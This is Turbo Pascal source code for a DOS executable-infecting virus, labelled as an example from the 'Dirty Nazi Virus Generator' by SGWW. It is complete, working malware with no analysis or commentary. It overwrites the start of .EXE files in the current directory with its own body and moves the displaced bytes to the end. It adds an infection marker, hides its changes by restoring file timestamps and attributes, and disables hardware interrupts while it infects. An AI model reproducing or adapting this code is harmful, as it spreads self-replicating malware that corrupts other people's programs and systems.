{$M 2048 , 0 , 0}
{$A-}
{$B-}
{$D-}
{$E+}
{$F-}
{$G-}
{$I-}
{$L-}
{$N-}
{$S-}
{$V-}
{$X+}

Uses Dos;

 Const
     VirName   =  '[Example for Dirty Nazi Virus Generator]';
     VirLabel  : String[5] = 'DNazi';
     VirLen    =  5040;
     Author    =  '(c) Dirty Nazi / SGWW';
     DNVG      =  '[Dirty Nazi Virus Generator / SGWW]';
     InfCount  =  2;

 Var
    VirIdentifier     :  Array [1..5] of Char;
    VirBody           :  File;
    CmdLine           :  String;
    OurName           :  PathStr;
    I                 :  Integer;
    Target            :  File;
    TargetFile        :  PathStr;
    VirBuf            :  Array [1..VirLen] of Char;
    TargetBuf         :  Array [1..VirLen] of Char;
    Attr              :  Word;
    Time              :  LongInt;
    InfFiles          :  Byte;
    DirInfo           :  SearchRec;
    LabelBuf          :  Array [1..5] of Char;

 procedure Init;
  begin

     OurName:=ParamStr(0);

     LabelBuf[1]:=VirLabel[1];
     LabelBuf[2]:=VirLabel[2];
     LabelBuf[3]:=VirLabel[3];
     LabelBuf[4]:=VirLabel[4];
     LabelBuf[5]:=VirLabel[5];

     InfFiles:=0;

     CmdLine:='';

     Assign(VirBody , ParamStr(0));
     Reset(VirBody , 1);

     BlockRead(VirBody , VirBuf , VirLen);

     Close(VirBody);

     IF ParamCount <> 0 Then
        Begin
           For I:=1 To ParamCount Do
             CmdLine:=CmdLine + ' ' + ParamStr(I);
        End;

 end;

 procedure ExecOriginal;
  begin

    FindFirst(ParamStr(0) , AnyFile , DirInfo);

    Assign(VirBody , ParamStr(0));

    Time:=DirInfo.Time;
    Attr:=DirInfo.Attr;

    SetFAttr(VirBody , Archive);

    Reset(VirBody , 1);

    Seek(VirBody , DirInfo.Size - VirLen - 5);

    BlockRead(VirBody , TargetBuf , VirLen);

    Seek(VirBody , DirInfo.Size - VirLen - 5);
    Truncate(VirBody);

    Seek(VirBody , 0);
    BlockWrite(VirBody , TargetBuf , VirLen);

    SetFTime(VirBody , Time);
    SetFAttr(VirBody , Attr);

    Close(VirBody);

    SwapVectors;
      Exec(GetEnv('COMSPEC') , '/C ' + OurName + CmdLine);
    SwapVectors;

    Assign(VirBody , ParamStr(0));

    SetFAttr(VirBody , Archive);

    Reset(VirBody , 1);

    BlockWrite(VirBody , VirBuf , VirLen);

    Seek(VirBody , DirInfo.Size - VirLen - 5);

    BlockWrite(VirBody , TargetBuf , VirLen);

    Seek(Virbody , DirInfo.Size - 5);

    BlockWrite(VirBody , LabelBuf , 5);

    SetFTime(VirBody , Time);
    SetFAttr(VirBody , Attr);

    Close(VirBody);

 end;


 procedure FindTarget;

  Var
     Sr  :  SearchRec;

 function VirusPresent : Boolean;
  begin

     VirusPresent:=False;

     Assign(Target , TargetFile);
     Reset(Target , 1);

     Seek(Target , Sr.Size - 5);
     BlockRead(Target , VirIdentifier , 5);

     If VirIdentifier = VirLabel Then
      VirusPresent:=True;

 end;

 procedure InfectFile;
  begin

   If Sr.Size < VirLen * 2  Then Exit;

   If Not VirusPresent Then
    begin

       Time:=Sr.Time;
       Attr:=Sr.Attr;

       Assign(Target , TargetFile);
       SetFAttr(Target, Archive);
       Reset(Target , 1);

       BlockRead(Target , TargetBuf , VirLen);

       Seek(Target , 0);
       BlockWrite(Target, VirBuf, VirLen);

       Seek(Target , Sr.Size);
       BlockWrite(Target , TargetBuf , VirLen);

       Seek(Target , Sr.Size + VirLen);

       BlockWrite(Target , LabelBuf , 5);

       SetFAttr(Target , Attr);
       SetFTime(Target , Time);

       Close(Target);

       Inc(InfFiles);

    end;
 end;

  begin

      FindFirst('*.EXE', Archive , Sr);
       While DosError = 0 Do
         begin

           If Sr.Name='' Then Exit;

           TargetFile:=Sr.Name;

           InfectFile;

           If InfFiles > InfCount Then Exit;

           FindNext(Sr);

         end;
  end;

 begin  { * MAIN BODY * }

     asm
         PUSH AX
         IN AL, 21h
         OR AL, 03h
         OUT 21h, AL
         POP AX
     end;

     Init;

     FindTarget;

     asm
         PUSH AX
         IN AL, 21h
         AND AL, 0FCh
         OUT 21h, AL
         POP AX
     end;

     ExecOriginal;

       If False Then
          begin
             WriteLn(VirName);
             WriteLn(Author);
             WriteLn(DNVG);
          end;

 end.